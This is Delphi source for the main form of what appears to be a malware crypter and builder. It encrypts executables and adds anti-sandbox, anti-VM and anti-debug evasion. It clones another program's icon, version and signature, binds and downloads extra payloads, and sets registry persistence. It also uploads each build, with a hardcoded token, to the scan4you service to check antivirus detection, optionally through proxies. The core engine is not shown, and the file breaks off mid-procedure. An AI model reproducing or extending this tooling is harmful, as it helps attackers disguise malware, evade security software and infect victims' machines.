unit U_FrmMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, GDIPImageTextItem, GDIPImageItem, GDIPCustomItem, GDIPTextItem,
  GDIPSectionItem, GDIPImageSectionItem, se_controls, bsPngImageList, ComCtrls,
  bsSkinCtrls, bsSkinExCtrls, StdCtrls, AdvPolyPager, AdvSmoothLabel, Mask,
  bsSkinBoxCtrls, AdvSmoothButton, AdvSmoothPanel, ImgList, AdvSmoothListBox,
  AdvSmoothComboBox, AdvCombo, AdvPageControl,  bsSkinTabs, bsSkinData,
  ExtCtrls, Menus, bsSkinMenus, bsSkinShellCtrls, IdMultipartFormData,
  IdBaseComponent, IdComponent,  IdTCPConnection, IdTCPClient, IdHTTP,
  IdGlobalProtocols, IdAntiFreezeBase, IdAntiFreeze, AdvGlassButton,
  IdCustomTransparentProxy, IdSocks,  IdIOHandler, IdIOHandlerSocket, IdIOHandlerStack,
  IdIntercept, IdLogBase, IdLogFile;

type
  TFrm_Main = class(TForm)
    PageManager: TAdvPolyPager;
    Menu_Files: TAdvPolyPage;
    Menu_Clonner: TAdvPolyPage;
    Menu_Misc: TAdvPolyPage;
    Menu_Build: TAdvPolyPage;
    Menu_About: TAdvPolyPage;
    Tab_Mainmenu: TImageSectionItem;
    Tab_Files: TImageItem;
    Tab_Cloner: TImageItem;
    Tab_Misc: TImageItem;
    Tab_Build: TImageItem;
    Tab_About: TImageItem;
    FM_ImageList48: TbsPngImageList;
    FM_ImageList32: TbsPngImageList;
    bsPngImageView10: TbsPngImageView;
    bsPngImageView11: TbsPngImageView;
    bsPngImageView12: TbsPngImageView;
    bsPngImageView13: TbsPngImageView;
    bsPngImageView14: TbsPngImageView;
    bsPngImageView15: TbsPngImageView;
    bsPngImageView16: TbsPngImageView;
    bsPngImageView17: TbsPngImageView;
    bsPngImageView18: TbsPngImageView;
    bsPngImageView19: TbsPngImageView;
    bsPngImageView20: TbsPngImageView;
    bsPngImageView21: TbsPngImageView;
    bsPngImageView22: TbsPngImageView;
    bsPngImageView23: TbsPngImageView;
    bsPngImageView24: TbsPngImageView;
    bsPngImageView25: TbsPngImageView;
    bsPngImageView26: TbsPngImageView;
    bsPngImageView7: TbsPngImageView;
    bsPngImageView8: TbsPngImageView;
    bsPngImageView9: TbsPngImageView;
    bsSkinDivider1: TbsSkinDivider;
    bsSkinDivider2: TbsSkinDivider;
    bsSkinStdLabel21: TbsSkinStdLabel;
    bsSkinStdLabel35: TbsSkinStdLabel;
    bsSkinStdLabel36: TbsSkinStdLabel;
    bsSkinStdLabel37: TbsSkinStdLabel;
    bsSkinStdLabel38: TbsSkinStdLabel;
    bsSkinStdLabel39: TbsSkinStdLabel;
    bsSkinStdLabel40: TbsSkinStdLabel;
    bsSkinStdLabel41: TbsSkinStdLabel;
    bsSkinStdLabel42: TbsSkinStdLabel;
    bsSkinStdLabel45: TbsSkinStdLabel;
    bsSkinStdLabel46: TbsSkinStdLabel;
    bsSkinStdLabel47: TbsSkinStdLabel;
    bsSkinStdLabel48: TbsSkinStdLabel;
    bsSkinStdLabel49: TbsSkinStdLabel;
    bsSkinStdLabel50: TbsSkinStdLabel;
    bsSkinStdLabel51: TbsSkinStdLabel;
    bsSkinStdLabel52: TbsSkinStdLabel;
    bsSkinStdLabel53: TbsSkinStdLabel;
    bsSkinStdLabel54: TbsSkinStdLabel;
    bsSkinStdLabel55: TbsSkinStdLabel;
    seXLabel1: TseXLabel;
    skinstore: TbsCompressedStoredSkin;
    skindata: TbsSkinData;
    bsSkinPageControl1: TbsSkinPageControl;
    bsSkinTabSheet1: TbsSkinTabSheet;
    Panel1: TPanel;
    AdvSmoothLabel1: TAdvSmoothLabel;
    AdvSmoothLabel2: TAdvSmoothLabel;
    AdvSmoothLabel3: TAdvSmoothLabel;
    AdvSmoothLabel4: TAdvSmoothLabel;
    AdvSmoothLabel5: TAdvSmoothLabel;
    AdvSmoothLabel6: TAdvSmoothLabel;
    AdvSmoothPanel1: TAdvSmoothPanel;
    FM_ImageCrypter: TbsPngImageView;
    AdvSmoothLabel7: TAdvSmoothLabel;
    AdvSmoothLabel8: TAdvSmoothLabel;
    edit_cryptfile: TbsSkinEdit;
    edit_cryptparam: TbsSkinEdit;
    edit_cryptenc: TAdvComboBox;
    edit_cryptcomp: TAdvComboBox;
    edit_cryptrun: TAdvComboBox;
    check_pacthPeb: TCheckBox;
    bsSkinTabSheet2: TbsSkinTabSheet;
    bsSkinTabSheet3: TbsSkinTabSheet;
    Panel2: TPanel;
    AdvSmoothPanel2: TAdvSmoothPanel;
    bsPngImageView1: TbsPngImageView;
    AdvSmoothLabel15: TAdvSmoothLabel;
    AdvSmoothLabel16: TAdvSmoothLabel;
    Panel3: TPanel;
    AdvSmoothPanel3: TAdvSmoothPanel;
    bsPngImageView2: TbsPngImageView;
    AdvSmoothLabel9: TAdvSmoothLabel;
    AdvSmoothLabel10: TAdvSmoothLabel;
    Panel4: TPanel;
    AdvSmoothLabel11: TAdvSmoothLabel;
    AdvSmoothLabel12: TAdvSmoothLabel;
    AdvSmoothPanel4: TAdvSmoothPanel;
    bsPngImageView3: TbsPngImageView;
    AdvSmoothLabel19: TAdvSmoothLabel;
    AdvSmoothLabel20: TAdvSmoothLabel;
    Edit_CloneSource: TbsSkinEdit;
    Check_CloneVersion: TbsSkinCheckRadioBox;
    Check_CloneIcon: TbsSkinCheckRadioBox;
    Check_CloneSign: TbsSkinCheckRadioBox;
    bsSkinPageControl2: TbsSkinPageControl;
    bsSkinTabSheet4: TbsSkinTabSheet;
    Panel5: TPanel;
    AdvSmoothPanel5: TAdvSmoothPanel;
    bsPngImageView4: TbsPngImageView;
    AdvSmoothLabel23: TAdvSmoothLabel;
    AdvSmoothLabel24: TAdvSmoothLabel;
    bsSkinTabSheet5: TbsSkinTabSheet;
    Panel6: TPanel;
    AdvSmoothPanel6: TAdvSmoothPanel;
    bsPngImageView5: TbsPngImageView;
    AdvSmoothLabel25: TAdvSmoothLabel;
    AdvSmoothLabel26: TAdvSmoothLabel;
    bsSkinTabSheet6: TbsSkinTabSheet;
    Panel7: TPanel;
    AdvSmoothPanel7: TAdvSmoothPanel;
    bsPngImageView6: TbsPngImageView;
    AdvSmoothLabel27: TAdvSmoothLabel;
    AdvSmoothLabel28: TAdvSmoothLabel;
    AdvSmoothLabel13: TAdvSmoothLabel;
    Check_AntiSandbox: TCheckBox;
    AdvSmoothLabel14: TAdvSmoothLabel;
    Check_AntiVM: TCheckBox;
    AdvSmoothLabel17: TAdvSmoothLabel;
    Check_AntiDebug: TCheckBox;
    AdvSmoothLabel18: TAdvSmoothLabel;
    Check_AntiMonitor: TCheckBox;
    AdvSmoothLabel21: TAdvSmoothLabel;
    Check_AntiEmulator: TCheckBox;
    Check_Activex: TbsSkinCheckRadioBox;
    Check_Policies: TbsSkinCheckRadioBox;
    Check_HKCU: TbsSkinCheckRadioBox;
    Check_HKLM: TbsSkinCheckRadioBox;
    AdvSmoothLabel22: TAdvSmoothLabel;
    AdvSmoothLabel29: TAdvSmoothLabel;
    AdvSmoothLabel30: TAdvSmoothLabel;
    AdvSmoothLabel31: TAdvSmoothLabel;
    Edit_Activex: TbsSkinEdit;
    Edit_Policies: TbsSkinEdit;
    Edit_HKCU: TbsSkinEdit;
    Edit_HKLM: TbsSkinEdit;
    AdvSmoothLabel32: TAdvSmoothLabel;
    messagetype: TAdvComboBox;
    AdvSmoothLabel33: TAdvSmoothLabel;
    Group_message: TCheckBox;
    AdvSmoothLabel34: TAdvSmoothLabel;
    messagecaption: TbsSkinEdit;
    AdvSmoothLabel35: TAdvSmoothLabel;
    messagetext: TbsSkinEdit;
    AdvSmoothLabel36: TAdvSmoothLabel;
    messageicon: TAdvComboBox;
    AdvSmoothLabel37: TAdvSmoothLabel;
    messagebutton: TAdvComboBox;
    messagetest: TAdvSmoothButton;
    bsSkinPageControl3: TbsSkinPageControl;
    bsSkinTabSheet7: TbsSkinTabSheet;
    Panel8: TPanel;
    AdvSmoothPanel8: TAdvSmoothPanel;
    bsPngImageView27: TbsPngImageView;
    AdvSmoothLabel43: TAdvSmoothLabel;
    AdvSmoothLabel44: TAdvSmoothLabel;
    bsSkinTabSheet8: TbsSkinTabSheet;
    Panel9: TPanel;
    AdvSmoothPanel9: TAdvSmoothPanel;
    bsPngImageView28: TbsPngImageView;
    AdvSmoothLabel51: TAdvSmoothLabel;
    AdvSmoothLabel52: TAdvSmoothLabel;
    bsSkinTabSheet9: TbsSkinTabSheet;
    Panel10: TPanel;
    AdvSmoothPanel10: TAdvSmoothPanel;
    bsPngImageView29: TbsPngImageView;
    AdvSmoothLabel57: TAdvSmoothLabel;
    AdvSmoothLabel58: TAdvSmoothLabel;
    AdvSmoothLabel38: TAdvSmoothLabel;
    AdvSmoothLabel39: TAdvSmoothLabel;
    check_PE1: TCheckBox;
    check_PE2: TCheckBox;
    check_PE3: TCheckBox;
    AdvSmoothLabel40: TAdvSmoothLabel;
    check_Misc1: TCheckBox;
    check_Misc2: TCheckBox;
    ListBox_BuildLog: TbsSkinOfficeListBox;
    ProgressBuild: TbsSkinGauge;
    ProgressScan: TbsSkinGauge;
    avresult: TbsSkinOfficeListBox;
    Panel11: TPanel;
    List_Binder: TListView;
    Panel12: TPanel;
    List_Downloader: TListView;
    List_icon: TListView;
    AdvSmoothLabel42: TAdvSmoothLabel;
    Image1: TImage;
    Label1: TLabel;
    OpenDialog: TOpenDialog;
    PopUp_Binder: TPopupMenu;
    Add1: TMenuItem;
    Edit1: TMenuItem;
    N1: TMenuItem;
    DeleteFromList1: TMenuItem;
    ClearList1: TMenuItem;
    PopUp_Down: TPopupMenu;
    MenuItem1: TMenuItem;
    MenuItem2: TMenuItem;
    MenuItem3: TMenuItem;
    MenuItem4: TMenuItem;
    MenuItem5: TMenuItem;
    PopUp_Icon: TPopupMenu;
    Add2: TMenuItem;
    ImageList1: TImageList;
    Select1: TMenuItem;
    N2: TMenuItem;
    DeleteFromList2: TMenuItem;
    ClearList2: TMenuItem;
    savedialog: TSaveDialog;
    AntiFreeze: TIdAntiFreeze;
    btn_StartBuild: TAdvGlassButton;
    btn_avscan: TAdvGlassButton;
    btn_openclone: TAdvGlassButton;
    btn_opencrypt: TAdvGlassButton;
    Check_Eof: TCheckBox;
    Edit_filetostub: TAdvComboBox;
    check_logbuild: TCheckBox;
    AdvSmoothLabel41: TAdvSmoothLabel;
    check_proxy: TCheckBox;
    procedure btn_opencryptClick(Sender: TObject);
    procedure edit_cryptrunChange(Sender: TObject);
    procedure DeleteFromList1Click(Sender: TObject);
    procedure ClearList1Click(Sender: TObject);
    procedure Add1Click(Sender: TObject);
    procedure Edit1Click(Sender: TObject);
    procedure MenuItem1Click(Sender: TObject);
    procedure MenuItem2Click(Sender: TObject);
    procedure MenuItem4Click(Sender: TObject);
    procedure MenuItem5Click(Sender: TObject);
    procedure Add2Click(Sender: TObject);
    procedure Select1Click(Sender: TObject);
    procedure DeleteFromList2Click(Sender: TObject);
    procedure ClearList2Click(Sender: TObject);
    procedure btn_opencloneClick(Sender: TObject);
    procedure Group_messageClick(Sender: TObject);
    procedure messagetestClick(Sender: TObject);
    procedure messageiconChange(Sender: TObject);
    procedure messagebuttonChange(Sender: TObject);
    procedure Check_HKLMClick(Sender: TObject);
    procedure Check_HKCUClick(Sender: TObject);
    procedure Check_ActivexClick(Sender: TObject);
    procedure Check_PoliciesClick(Sender: TObject);
    procedure btn_StartBuildClick(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure HttpWork(ASender: TObject; AWorkMode: TWorkMode; AWorkCount: Int64);
    procedure HttpWorkBegin(ASender: TObject; AWorkMode: TWorkMode;  AWorkCountMax: Int64);
    procedure btn_avscanClick(Sender: TObject);
    procedure Edit_filetostubChange(Sender: TObject);
    procedure Edit_ActivexClick(Sender: TObject);
    procedure check_proxyClick(Sender: TObject);
  private
    { Private declarations }
    selectediconindex : integer;
    selectedicon :string;
    Procedure AddIcon(filename:string);
    procedure Selecticonlist(list:Tlistitem);
    procedure selecticon(icon:Ticon);
    procedure UpdateStatus(status:string;progress:integer);
    Procedure Build(const projectname,dirpath:string);
    function ProcessData(Data:ansistring):ansistring;
  public
    { Public declarations }
    Function ScanFIle(filename:string;Id:integer):string;
    function CHeckProxy(ptype:integer;Host:string;Port:integer;user,pass:string):boolean;
  end;

var
  Frm_Main: TFrm_Main;
  iButton,iIcon :Dword;

implementation

{$R *.dfm}
{$R resources.RES}

uses
U_Type, U_Utils, U_PEUtils, U_Chiper, U_RetCompress, U_SmallZlib, U_Encryption,
U_Engine,  U_HashList, U_Cloner, StreamHelper, U_Hardwareid, U_ThreadHandle,
U_Compiler,
U_FrmExecute, U_FrmDrop, U_FrmBinder, U_FrmDownloader, U_FrmResource, U_FrmSection,
U_FrmProxy;

type
  PMyIcon = ^TmyIcon;
  TMyIcon = record
    Filename :String[255];
    IconName :String[255];
  end;

const
pattern1 = '<div align="center" style="font-family:Arial, Helvetica, sans-serif; font-size:36px; color:#694404"><b>';
pattern2 = 'Country Name:</b>';

Function TFrm_Main.CHeckProxy(ptype:integer;Host:string;Port:integer;user,pass:string):boolean;
var
  Fhttp: TIdHTTP;
  IdSocksInfo : TIdSocksInfo;
  Fhandler : TIdIOHandlerStack;
  html :string;
  d : integer;
  ip,country : string;
begin
  result := false;
  application.ProcessMessages;
  Fhttp := TIdHTTP.Create(nil);
  Fhandler := TIdIOHandlerStack.Create(nil);
  Fhttp.IOHandler := Fhandler;
  IdSocksInfo := nil;
  try
    if (Host <> '') and (Port<>0) then
    begin
      if (ptype = 0) then
      begin
        Fhttp.ProxyParams.ProxyServer := Host;
        Fhttp.ProxyParams.ProxyPort := Port;
        if (user <> '') and (pass <> '') then
        begin
          Fhttp.ProxyParams.BasicAuthentication := true;
          Fhttp.ProxyParams.ProxyUsername := user;
          Fhttp.ProxyParams.ProxyPassword := pass;
        end;
      end else
      begin
        IdSocksInfo := TIdSocksInfo.Create(nil);
        IdSocksInfo.Host := Host;
        IdSocksInfo.Port := port;
        if (user <> '') and (pass <> '') then
        begin
          IdSocksInfo.Authentication := saUsernamePassword;
          IdSocksInfo.Username := user;
          IdSocksInfo.Password := pass;
        end else
        begin
          IdSocksInfo.Authentication := saNoAuthentication;
        end;
        case ptype of
          1 : IdSocksInfo.Version := svSocks4;
          2 : IdSocksInfo.Version := svSocks4A;
          3 : IdSocksInfo.Version := svSocks5;
        end;
        Fhandler.TransparentProxy := IdSocksInfo;
      end;
      Fhttp.HandleRedirects := true;
      Fhttp.Request.Connection := 'close';
      Fhttp.ReadTimeout := 50000;
      try
        html := Fhttp.get('http://get-myip.com/');
        d := pos(pattern1,html);
        if (d<>0) then
        begin
          delete(html,1,d+length(pattern1));
          ip := copy(html,1,pos('</b></div>',html)-1);
        end;
        d := pos(pattern2,html);
        if (d<>0) then
        begin
          delete(html,1,d+length(pattern2));
          country := copy(html,1,pos('<br>',html)-1);
        end;
        result := (ip<>'') and (country <> '');
      Except
      end;
    end;
  finally
    if assigned(IdSocksInfo) then IdSocksInfo.Free;
    if assigned(Fhandler) then Fhandler.Free;
    if assigned(Fhttp) then Fhttp.Free;
  end;
end;

procedure TFrm_Main.HttpWorkBegin(ASender: TObject; AWorkMode: TWorkMode;  AWorkCountMax: Int64);
begin
  ProgressScan.MaxValue := AWorkCountMax;
end;

procedure TFrm_Main.HttpWork(ASender: TObject; AWorkMode: TWorkMode; AWorkCount: Int64);
begin
  ProgressScan.Value := AWorkCount;
  ProgressScan.Update;
end;

Function TFrm_Main.ScanFIle(filename:string;Id:integer):string;
var
  Fhttp: TIdHTTP;
  FMultiStream: TIdMultiPartFormDataStream;
  IdSocksInfo : TIdSocksInfo;
  Fhandler : TIdIOHandlerStack;
  proxyresult : boolean;
begin
  result := '';
  application.ProcessMessages;
  if (FileName <> '') then
  begin
    Fhttp := TIdHTTP.Create(nil);
    FMultiStream := TIdMultiPartFormDataStream.Create;
    Fhandler := TIdIOHandlerStack.Create(nil);
    Fhttp.IOHandler := Fhandler;
    IdSocksInfo := nil;
    if check_proxy.Checked and (settings.Proxy.Host <> '') and (settings.Proxy.port <> 0) then
    begin
      with settings.Proxy do
      begin
        proxyresult := CHeckProxy(ptype,Host,port,user,pass);
        if proxyresult then
        begin
          if (ptype = 0) then
          begin
            Fhttp.ProxyParams.ProxyServer := Host;
            Fhttp.ProxyParams.ProxyPort := Port;
            if (user <> '') and (pass <> '') then
            begin
              Fhttp.ProxyParams.BasicAuthentication := true;
              Fhttp.ProxyParams.ProxyUsername := user;
              Fhttp.ProxyParams.ProxyPassword := pass;
            end;
          end else
          begin
            IdSocksInfo := TIdSocksInfo.Create(nil);
            IdSocksInfo.Host := Host;
            IdSocksInfo.Port := port;
            if (user <> '') and (pass <> '') then
            begin
              IdSocksInfo.Authentication := saUsernamePassword;
              IdSocksInfo.Username := user;
              IdSocksInfo.Password := pass;
            end else
            begin
              IdSocksInfo.Authentication := saNoAuthentication;
            end;
            case ptype of
              1 : IdSocksInfo.Version := svSocks4;
              2 : IdSocksInfo.Version := svSocks4A;
              3 : IdSocksInfo.Version := svSocks5;
            end;
            Fhandler.TransparentProxy := IdSocksInfo;
          end;
        end;
      end;
    end;
    try try
      if id = 0 then
      begin
        ProgressScan.Value := 0;
        Fhttp.OnWork := HttpWork;
        Fhttp.OnWorkBegin := HttpWorkBegin;
      end;
      Fhttp.HandleRedirects := false;
      FMultiStream.AddFormField('id','2503');
      FMultiStream.AddFormField('token','57bf731236047d0fa647');
      FMultiStream.AddFormField('action','file');
      FMultiStream.AddFile('uppload',FileName,GetMIMETypeFromFile(FileName));
      result := Fhttp.Post('http://scan4you.net/remote.php', FMultiStream);
    Except
      on E:Exception do
      begin
        showmessage(E.Message);
      end;
    end;
    finally
      if assigned(Fhandler) then Fhandler.Free;
      if assigned(IdSocksInfo) then IdSocksInfo.Free;
      if assigned(Fhttp) then Fhttp.Free;
      if assigned(FMultiStream) then FMultiStream.Free;
    end;
  end;
end;

procedure TFrm_Main.UpdateStatus(status:string;progress:integer);
var
List : TbsSkinOfficeItem;
begin
  ListBox_BuildLog.Items.BeginUpdate;
  try
    List := ListBox_BuildLog.Items.Add;
    List.Caption := '   '+FormatDateTime('hh:nn:ss ampm',Now)+' : '+status;
    List.ImageIndex := 6;
    ProgressBuild.Value := ProgressBuild.Value + progress;
  finally
    ListBox_BuildLog.Items.EndUpdate;
  end;
  ListBox_BuildLog.ItemIndex := ListBox_BuildLog.Items.Count-1;
  application.ProcessMessages;
end;

procedure TFrm_Main.selecticon(icon:Ticon);
begin
  image1.Picture := nil;
  image1.Picture.Assign(icon);
  image1.Refresh;
end;

procedure TFrm_Main.Selecticonlist(list:Tlistitem);
var
picon : PMyIcon;
Icon: TIcon;
iconname : string;
begin
  if assigned(list) and assigned(list.Data) then
  begin
    picon := list.data;
    iconname := string(picon^.IconName);
    if fileexists(iconname) then
    begin
      Icon := TIcon.Create;
      try
        Icon.LoadFromFile(iconname);
        selecticon(icon);
        selectedicon := iconname;
        selectediconindex := list.Index;
      finally
        Icon.Free;
      end;
    end;
  end else begin
    selectedicon := '';
    selectediconindex := -1;
    image1.Picture := nil;
    image1.Refresh;
  end;
end;

Procedure TFrm_Main.AddIcon(filename:string);
var
picon : PMyIcon;
TempIcon : string;
Icon: TIcon;
bitmap : TBitmap;
list: TListItem;
begin
  if lowercase(ExtractFileExt(filename)) = '.exe' then
  begin
    TempIcon := TempDir + inttostr(GetTickCount) + '.ico';
    ExtractIcon(filename,TempIcon);
  end else TempIcon := filename;
  if fileexists(TempIcon) then
  begin
    new(picon);
    Icon := TIcon.Create;
    bitmap := TBitmap.Create;
    try
      picon^.Filename := ShortString(filename);
      picon^.IconName := ShortString(TempIcon);
      Icon.LoadFromFile(TempIcon);
      selecticon(icon);
      selectedicon := TempIcon;
      bitmap.Width := 32;
      bitmap.Height := 32;
      bitmap.Canvas.Draw(0,0,Icon);
      list := List_icon.Items.Add;
      list.ImageIndex := ImageList1.Add(bitmap,nil);
      selectediconindex := list.Index;
      list.Data := picon;
    finally
      Icon.Free;
      bitmap.Free;
    end;
  end;
end;

procedure TFrm_Main.Add1Click(Sender: TObject);
begin
  Frm_Binder := TFrm_Binder.Create(Application);
  Frm_Binder.Caption := 'Binder Add';
  Frm_Binder.Left := Frm_Main.Left + 250;
  Frm_Binder.Top := Frm_Main.top + 50;
  Frm_Binder.ShowModal;
  Frm_Binder.Free;
end;

procedure TFrm_Main.Add2Click(Sender: TObject);
begin
  opendialog.Filter := 'Icon Files|*.exe;*.ico';
  opendialog.FileName := '';
  if opendialog.Execute Then
  begin
    if (opendialog.FileName <> '') and fileexists(opendialog.FileName) then
    begin
      AddIcon(opendialog.FileName);
    end;
  end;
end;

procedure TFrm_Main.btn_avscanClick(Sender: TObject);
var
i,avcount : integer;
text,av,scanresult : string;
begin
  btn_avscan.Enabled := false;
  try
  opendialog.InitialDir := extractfilepath(paramstr(0));
  opendialog.Filter := 'EXE Files|*.exe';
  opendialog.FileName := '';
  if opendialog.Execute Then
  begin
    if (opendialog.FileName <> '') and fileexists(opendialog.FileName) then
    begin
      text := Scanfile(opendialog.FileName,0);
      if (text = '') then exit;
      avresult.Items.Clear;
      avresult.Update;
      with avresult.Items.Add do
      begin
        Caption := 'Start Scan';
        Header := true;
      end;
      avcount := 0;
      for i := 1 to 33 do
      begin
        av := Copy(text,1,pos(':',text)-1);
        delete(text,1,length(av)+1);
        scanresult := Copy(text,1,pos(#10,text)-1);
        delete(text,1,length(scanresult)+1);
        with avresult.Items.Add do
        begin
          Caption := '        '+av + '   :   ' +scanresult;
          if scanresult = 'OK' then ImageIndex := 10
          else begin
            inc(avcount);
            ImageIndex := 11
          end;
        end;
        avresult.Update;
      end;
      with avresult.Items.Add do
      begin
        Caption := 'Scan Finish : '+inttostr(avcount)+'/33';
        Header := true;
      end;
    end;
  end;
  finally
    ProgressScan.MaxValue := 100;
    ProgressScan.Value := 50;
    btn_avscan.Enabled := true;
  end;
  ProgressScan.MaxValue := 100;
  ProgressScan.Value := 50;
  btn_avscan.Enabled := true;
end;

procedure TFrm_Main.btn_opencloneClick(Sender: TObject);
begin
  opendialog.InitialDir := extractfilepath(paramstr(0));
  opendialog.Filter := 'EXE Files|*.exe';
  opendialog.FileName := '';
  if opendialog.Execute Then
  begin
    if (opendialog.FileName <> '') and fileexists(opendialog.FileName) then
    begin
      Edit_CloneSource.Text := opendialog.FileName;
      AddIcon(Edit_CloneSource.Text);
    end;
  end;
end;

procedure TFrm_Main.btn_opencryptClick(Sender: TObject);
begin
  opendialog.InitialDir := extractfilepath(paramstr(0));
  opendialog.Filter := 'EXE Files|*.exe';
  opendialog.FileName := '';
  if opendialog.Execute Then
  begin
    if (opendialog.FileName <> '') and fileexists(opendialog.FileName) then
      edit_cryptfile.Text := opendialog.FileName;
  end;
end;

function ExtractProject(FullName: String): String;
var
i, n: integer;
begin
  n := Length(FullName);
  Result := '';
  for i := n downto 1 do if FullName[i] = '.' then break;
  if i > 1 then Result := Copy(FullName, 1, i-1);
end;

procedure TFrm_Main.btn_StartBuildClick(Sender: TObject);
var
projectname:string;
begin
  {Check Edit_CryptFile not empty}
  if (Edit_CryptFile.Text = '') then
  begin
    Showmessage('Please Input File You Want Crypt...!!!');
    Exit;
  end;
  {Check file in Edit_CryptFile Exists}
  if not Fileexists(Edit_CryptFile.Text) then
  begin
    Showmessage('Please Input Correct Path File You Want Crypt...!!!');
    Exit;
  end;
  savedialog.InitialDir := extractfilepath(paramstr(0));
  savedialog.Filter := 'EXE Files|*.exe';
  savedialog.FileName := '';
  if savedialog.Execute Then
  begin
    if (savedialog.FileName <> '') then
    begin
      if fileexists(savedialog.FileName) then deleteFile(savedialog.FileName);
      projectname := ExtractProject(extractfilename(savedialog.FileName));
      Build(projectname,AddSlash(extractfilepath(savedialog.FileName)));
    end;
  end;
end;

procedure TFrm_Main.Check_ActivexClick(Sender: TObject);
begin
  Edit_Activex.Enabled := Check_Activex.Checked;
end;

procedure TFrm_Main.Check_HKCUClick(Sender: TObject);
begin
  Edit_HKCU.Enabled := Check_HKCU.Checked;
end;

procedure TFrm_Main.Check_HKLMClick(Sender: TObject);
begin
  Edit_HKLM.Enabled := Check_HKLM.Checked;
end;

procedure TFrm_Main.Check_PoliciesClick(Sender: TObject);
begin
  Edit_Policies.Enabled := Check_Policies.Checked;
end;

procedure TFrm_Main.check_proxyClick(Sender: TObject);
begin
  if check_proxy.Checked then
  begin
  Frm_Proxy := TFrm_Proxy.Create(Application);
  Frm_Proxy.Caption := 'Proxy Settings';
  Frm_Proxy.Left := Frm_Main.Left + 250;
  Frm_Proxy.Top := Frm_Main.top + 50;
  Frm_Proxy.ShowModal;
  Frm_Proxy.Free;
  end;
end;

procedure TFrm_Main.ClearList1Click(Sender: TObject);
var
i : integer;
begin
  for i := List_Binder.Items.Count -1 downto 0 do
  begin
    if assigned(list_binder.Items.Item[i].Data) then
      dispose(PBinder(list_binder.Items.Item[i].Data));
    list_binder.Items.Delete(i);
  end;
end;

procedure TFrm_Main.ClearList2Click(Sender: TObject);
var
i : integer;
myicon :PMyIcon;
begin
  for i := List_icon.Items.Count -1 downto 0 do
  begin
    myicon := PMyIcon(List_icon.Items.Item[i].Data);
    if assigned(myicon) then
    begin
      deletefile(string(myicon^.IconName));
      dispose(myicon);
    end;
    List_icon.Items.Delete(i);
  end;
  selectedicon := '';
  selectediconindex := -1;
  imagelist1.Clear;
end;

procedure TFrm_Main.DeleteFromList1Click(Sender: TObject);
begin
  if (List_Binder.Selected <> nil) then
  begin
    dispose(PBinder(list_binder.Selected.Data));
    List_Binder.DeleteSelected;
  end;
end;

procedure TFrm_Main.DeleteFromList2Click(Sender: TObject);
var
myicon :PMyIcon;
begin
  if (List_icon.Selected <> nil) then
  begin
    myicon := PMyIcon(List_icon.Selected.Data);
    if assigned(myicon) then
    begin
      deletefile(string(myicon^.IconName));
      dispose(myicon);
    end;
    if (selectediconindex = list_icon.Selected.Index) then
      Selecticonlist(list_icon.Items.Item[selectediconindex-1]);
    list_icon.DeleteSelected;
  end;
end;

procedure TFrm_Main.Edit1Click(Sender: TObject);
var
List :Tlistitem;
Data :PBinder;
begin  if (List_Binder.Selected <> nil) then
  begin
    List := List_Binder.Selected;
    Data := List.Data;
    Frm_Binder := TFrm_Binder.Create(Application);
    Frm_Binder.Caption := 'Binder Edit '+Inttostr(List.Index);
    Frm_Binder.FB_EditFile.Text := List.Caption;
    Frm_Binder.FB_EditParam.Text := String(Data^.Parameter);
    Frm_Binder.FB_EditlDelay.Value := Data^.Delay;
    Frm_Binder.FB_ComboExec.ItemIndex := Data^.Exec;
    Frm_Binder.FB_ComboExecChange(Sender);
    Frm_Binder.FB_C_ExecPath.ItemIndex := Data^.Path;
    Frm_Binder.FB_C_ExecPathChange(Sender);
    Frm_Binder.FB_C_ExecName.Text := String(Data^.Name);
    Frm_Binder.Left := Frm_Main.Left + 250;
    Frm_Binder.Top := Frm_Main.top + 50;
    Frm_Binder.ShowModal;
    Frm_Binder.Free;
  end;
end;

procedure TFrm_Main.Edit_ActivexClick(Sender: TObject);
begin
  Edit_Activex.Text := GenID;
end;

procedure TFrm_Main.edit_cryptrunChange(Sender: TObject);
begin
  if edit_cryptrun.ItemIndex = 1 then
  begin
    Frm_Execute := TFrm_Execute.Create(Application);
    Frm_Execute.Left := Frm_Main.Left + 300;
    Frm_Execute.Top := Frm_Main.top + 150;
    Frm_Execute.ShowModal;
    Frm_Execute.Free;
  end else
  if edit_cryptrun.ItemIndex = 2 then
  begin
    Frm_Drop := TFrm_Drop.Create(Application);
    Frm_Drop.Left :=Frm_Main.Left + 300;
    Frm_Drop.Top := Frm_Main.top + 150;
    Frm_Drop.ShowModal;
    Frm_Drop.Free;
  end;
end;

procedure TFrm_Main.Edit_filetostubChange(Sender: TObject);
begin
  if (Edit_filetostub.itemindex = 1) then
  begin
    Frm_Resource := TFrm_Resource.Create(nil);
    Frm_Resource.Left := Frm_Main.Left + 270;
    Frm_Resource.Top := Frm_Main.top + 150;
    Frm_Resource.FR_Type.itemindex := ConvertToResType(Settings.Resource.RType);
    Frm_Resource.FR_Name.text := Settings.Resource.RName;
    Frm_Resource.FR_Split.Value := Settings.Resource.RSplit;
    Frm_Resource.ShowModal;
    Frm_Resource.Free;
  end else
  if (Edit_filetostub.itemindex = 2) then
  begin
    Frm_Section := TFrm_Section.Create(nil);
    Frm_Section.Left := Frm_Main.Left + 300;
    Frm_Section.Top := Frm_Main.top + 150;
    Frm_Section.FS_SName.Text := settings.Section.SName;
    Frm_Section.Check_Sect1.Checked := settings.Section.Check1;
    Frm_Section.Check_Sect2.Checked := settings.Section.Check2;
    Frm_Section.Check_Sect3.Checked := settings.Section.Check3;
    Frm_Section.Check_Sect4.Checked := settings.Section.Check4;
    Frm_Section.ShowModal;
    Frm_Section.Free;
  end;
end;

procedure TFrm_Main.FormCreate(Sender: TObject);
begin
  {$I SE_PROTECT_START_ULTRA.inc}
  try
  if not LoadEngine('engine.bin',inttostr(GetHardwareid)) then
  begin
    showmessage('failed load engine');
    application.Terminate;
  end;
  Except
    showmessage('failed load engine');
    application.Terminate;
  end;
  {$I SE_PROTECT_END.inc}
end;

procedure TFrm_Main.FormDestroy(Sender: TObject);
begin
  ClearList1Click(nil);
  ClearList2Click(nil);
  MenuItem5Click(nil);
  MyProg.Free;
end;

procedure TFrm_Main.Group_messageClick(Sender: TObject);
begin
  if Group_message.Checked then
  begin
    messagetype.Enabled := true;
    messagecaption.Enabled := true;
    messagetext.Enabled := true;
    messageicon.Enabled := true;
    messagebutton.Enabled := true;
